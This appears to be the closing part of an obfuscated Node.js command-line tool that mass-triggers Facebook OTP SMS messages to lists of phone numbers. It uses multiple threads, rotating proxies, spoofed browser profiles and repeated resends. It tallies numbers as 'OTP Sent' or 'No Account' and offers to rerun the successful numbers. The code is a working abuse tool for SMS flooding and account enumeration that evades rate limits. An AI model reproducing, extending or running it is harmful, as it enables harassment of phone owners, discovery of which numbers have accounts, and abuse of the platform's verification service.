      const v1212 = await pickNumbersSource();
      v1200 = v1212.numbersFile, v1203 = v1212.nexaConfig, v1201 = await selectThreadCount(), SELECTED_BROWSER = await selectBrowserProfile(), syncUAAndHost(), await selectProxySetup(), v1205 = await selectRetryCount(), process.stdout.write("[2J[H"), printHeader();
      const v1213 = await promptText("Enter number of OTP resends per number [default: 0]:", '0'),
        v1214 = parseInt(v1213) || 0,
        v1215 = await confirmConfiguration(v1200, v1201, SELECTED_BROWSER);
      if (!v1215) {
        console.log(R("\n  [!] Launch cancelled. Exiting...\n")), process.exit(0);
      }
      v1202 = v1200, process.stdin.pause();
    } finally {
      clearInterval(v1210);
    }
  }
  let v1206 = true;
  while (v1206) {
    let v1235 = [];
    if (!v1203) {
      v1235 = loadNumbers(v1200);
      if (proxyManager.hasProxies) {
        dbg("PROXY STATUS: " + proxyManager.proxies.length + " proxies loaded, testing connectivity...");
        const v1241 = await proxyManager.testConnectivity();
        if (!v1241) {
          const v1242 = await ask(Y("  [!] Proxy failed. Continue without proxy? (y/N): "));
          if (v1242.toLowerCase() !== 'y') {
            console.log(G("\n  Aborted.\n")), process.exit(0);
          }
          dbg("USER CHOSE TO CLEAR PROXIES"), proxyManager.proxies = [];
        }
      } else dbg("PROXY STATUS: No proxies loaded, using direct connection");
    }
    await sleep(1000);
    const v1236 = await runPool(v1235, v1201, null, v1202, v1203, v1204, v1205),
      v1237 = path.join(__dirname, "results"),
      v1238 = path.join(v1237, "otp_sent.txt"),
      v1239 = path.join(v1237, "checkpoint.txt");
    if (v1236.success.length > 0) {
      const v1243 = {};
      v1243.recursive = true;
      if (!fs.existsSync(v1237)) fs.mkdirSync(v1237, v1243);
      fs.writeFileSync(v1238, v1236.success.join('\x0a') + '\x0a');
    }
    if (v1236.captcha && v1236.captcha.length > 0) {
      const v1244 = {};
      v1244.recursive = true;
      if (!fs.existsSync(v1237)) fs.mkdirSync(v1237, v1244);
      fs.appendFileSync(v1239, v1236.captcha.join('\x0a') + '\x0a');
    }
    console.log(''), console.log(B("  ╔════════════════════════════════════════════╗")), console.log(B("  ║") + W.bold("  V6 API OTP — COMPLETE                     ") + B('║')), console.log(B("  ╠════════════════════════════════════════════╣")), console.log(B("  ║") + ('\x20\x20' + chalk.greenBright("OTP Sent") + "     " + chalk.greenBright(String(v1236.success.length).padStart(6))) + "                  " + B('║')), console.log(B("  ║") + ('\x20\x20' + G("No Account") + "   " + G(String(v1236.noAccount.length).padStart(6))) + "                  " + B('║')), console.log(B("  ║") + ('\x20\x20' + Y("No SMS") + "       " + Y(String(v1236.noSms.length).padStart(6))) + "                  " + B('║')), console.log(B("  ║") + ('\x20\x20' + R("Errors") + "       " + R(String(v1236.errors.length).padStart(6))) + "                  " + B('║')), console.log(B("  ║") + ('\x20\x20' + C("Data Used") + "    " + C((dataMB() + " MB").padEnd(20))) + "    " + B('║'));
    if (proxyManager.hasProxies) {
      console.log(B("  ║") + ('\x20\x20' + C("Proxy") + "        " + C(proxyManager.getStatus().padEnd(20))) + "    " + B('║'));
    }
    console.log(B("  ╚════════════════════════════════════════════╝\n"));
    const v1240 = await selectOption("Processing Complete. What next?", [{
      'name': "Reuse successful numbers (" + v1238 + ')',
      'value': "reuse"
    }, {
      'name': "Go Home (Restart)",
      'value': "home"
    }, {
      'name': "Exit",
      'value': "exit"
    }]);
    if (v1240 === "reuse") {
      if (fs.existsSync(v1238)) {
        let v1245 = fs.readFileSync(v1238, "utf8").split('\x0a').map(v1246 => v1246.trim()).filter(v1247 => v1247.length > 5);
        fs.writeFileSync(v1200, v1245.join('\x0a')), fs.writeFileSync(v1238, ''), console.log("\n  [32m✓ Copied " + v1245.length + " successful numbers to " + v1200 + " and cleared " + v1238 + ".[0m\n");
      } else {
        console.log("\n  [31m✗ No successful numbers found.[0m\n"), v1206 = false;
      }
    } else {
      if (v1240 === "home") {
        {
          const v1248 = setInterval(() => {}, 10000);
          try {
            const v1249 = await pickNumbersSource();
            v1200 = v1249.numbersFile, v1203 = v1249.nexaConfig, v1201 = await selectThreadCount(), SELECTED_LANG = await selectFacebookUrl(), FB_HOST = SELECTED_LANG === "random" ? "www.facebook.com" : SELECTED_LANG, SELECTED_BROWSER = await selectBrowserProfile(), syncUAAndHost(FB_HOST), await selectProxySetup();
            const v1250 = await promptText("Enter number of OTP resends per number [default: 0]:", '0');
            v1204 = parseInt(v1250) || 0, v1202 = v1200;
          } finally {
            clearInterval(v1248);
          }
        }
      } else {
        v1206 = false;
      }
    }
  }
}
main()["catch"](v1251 => {
  try {
    fs.appendFileSync(path.join(__dirname, "fatal_error.log"), '[' + new Date().toISOString() + ']\x20' + (v1251.stack || v1251.message) + '\x0a');
  } catch (v1252) {}
  console.log(R("\n  [!] Fatal: " + v1251.message)), process.exit(1);
});